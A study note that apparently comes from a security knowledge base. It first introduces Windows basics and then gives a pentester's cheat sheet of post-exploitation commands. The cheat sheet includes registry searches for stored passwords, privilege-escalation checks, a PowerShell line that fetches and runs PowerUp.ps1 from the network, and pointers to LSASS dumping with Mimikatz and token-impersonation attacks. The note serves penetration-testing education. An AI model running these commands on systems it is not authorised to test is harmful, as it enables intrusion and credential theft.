# Windows
## What is Windows?

Windows is an operating system (OS) developed by Microsoft. An operating system is like the brain of your computer – it manages the hardware, software, and other resources, allowing your computer to function.

## Versions of Windows

Over the years, Microsoft has released several versions of Windows. Some of the most popular ones include Windows XP, Windows 7, Windows 8, Windows 10, and Windows 11. Each version has brought new features, improvements, and updates.

## Desktop and Start Menu

When you start your computer, you'll see your desktop. The desktop is like your computer's main screen, and it's where you can place shortcuts to your favorite programs or files. The Start Menu is a button usually located at the bottom left of your screen. Clicking on it opens a menu with access to various features and applications.

## File Explorer

File Explorer is where you manage your files and folders. Think of it as a virtual filing cabinet. You can create, delete, copy, and move files using File Explorer. It helps you navigate through the different drives and folders on your computer.

## Taskbar

The taskbar is a bar usually found at the bottom of the screen. It contains the Start Menu, open program icons, and system notifications. You can pin your frequently used programs to the taskbar for quick access.

## Control Panel and Settings

These are places where you can customize your computer's settings. Control Panel is an older interface, and in Windows 10, Microsoft introduced the Settings app for a more modern and user-friendly approach.

## Updates

Windows regularly receives updates to improve security, fix bugs, and introduce new features. It's essential to keep your system updated to ensure it runs smoothly and stays protected.

## Software and Apps

Windows supports a wide range of software and applications. You can install programs to perform specific tasks like word processing, web browsing, or playing games.

## Security

Windows includes built-in security features like Windows Defender to protect your computer from viruses and malware. It's advisable to stay cautious while downloading files or clicking on links to avoid potential threats.

---

## Windows for penetration testers

Windows dominates the enterprise, so most internal pentests are Windows/Active Directory engagements. Know how to enumerate and escalate on a host.

### Post-exploitation enumeration

```cmd
:: Identity and privileges
whoami /all
whoami /priv          :: look for SeImpersonatePrivilege, SeBackupPrivilege, etc.
net user
net localgroup administrators

:: System info (match to privesc exploits)
systeminfo
hostname & ver

:: Network
ipconfig /all
netstat -ano
arp -a

:: Look for stored creds
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
```

```powershell
# PowerShell enumeration
Get-LocalUser; Get-LocalGroupMember Administrators
Get-Process; Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-ChildItem -Recurse -Include *.config,*.xml,unattend.xml -ErrorAction SilentlyContinue
```

### Privilege escalation quick wins

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Weak service permissions / modifiable binaries
# AlwaysInstallElevated (both keys = 1 -> install malicious MSI as SYSTEM)
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Automated enumeration

```cmd
winPEASx64.exe
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('...PowerUp.ps1'); Invoke-AllChecks"
```

### Key privesc / attack vectors

- **Token impersonation** (`SeImpersonatePrivilege`) → Potato attacks (JuicyPotato, PrintSpoofer) for SYSTEM.
- **Unquoted service paths** and **weak service perms**.
- **Credential harvesting** — LSASS dump with Mimikatz, SAM/SYSTEM hives.
- **AlwaysInstallElevated** MSI abuse.
- **Kernel exploits** matched from `systeminfo`.

## Related

- [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
- [Privilege Escalation](../Vulnerabilities/Privilege%20Escalation.md) · [Operating System Hardening](Operating%20System%20Hardening.md)
